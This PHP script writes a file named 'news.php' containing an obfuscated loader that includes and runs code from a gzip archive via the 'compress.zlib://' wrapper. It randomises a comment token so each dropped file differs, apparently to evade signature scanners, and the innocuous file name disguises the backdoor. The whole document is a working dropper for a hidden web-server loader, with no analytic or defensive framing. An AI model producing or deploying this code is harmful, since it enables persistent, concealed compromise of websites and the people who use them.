<?php /* 4Z2uZtTxNcRveVV */ ?>
<?php
/**
 * Generate a random string similar to the original comment token.
 * Length: 40–50 characters, mix of letters, numbers, and symbols.
 */
function randomCommentToken($length = 44) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*()-_=+{}[]|:;<>?,./';
    $token = '';
    for ($i = 0; $i < $length; $i++) {
        $token .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $token;
}

// Generate a new random token
$randomToken = randomCommentToken(44);  // similar length to the original

// The PHP code template (the same logic but with random comment)
$phpCode = <<<PHP
<?php
# {$randomToken}

\$bxoskw = function(\$p) { include \$p; };
\$stfhae = 'compress.zlib://ll2.gz';
call_user_func(\$bxoskw, \$stfhae);
?>
PHP;

// Write the generated code to a new file (e.g., "random_script.php")
$newFile = 'news.php';
file_put_contents($newFile, $phpCode);

echo "Generated file: $newFile with random token: $randomToken\n";
?>